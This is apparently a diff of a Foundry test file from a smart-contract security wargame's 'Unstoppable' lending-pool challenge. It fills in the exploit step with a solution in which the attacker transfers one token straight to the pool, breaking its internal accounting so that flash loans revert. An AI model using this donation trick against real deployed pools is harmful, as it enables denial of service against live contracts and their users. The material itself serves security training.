@@ -59,15 +59,11 @@ contract UnstoppableLenderTest is BaseTest {
     }
 
     function exploit() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
         vm.prank(attacker);
         token.transfer(address(pool), 1);
     }
 
     function success() internal override {
-        /** SUCCESS CONDITIONS */
-
         // It is no longer possible to execute flash loans
         vm.expectRevert(stdError.assertionError);
         vm.prank(someUser);
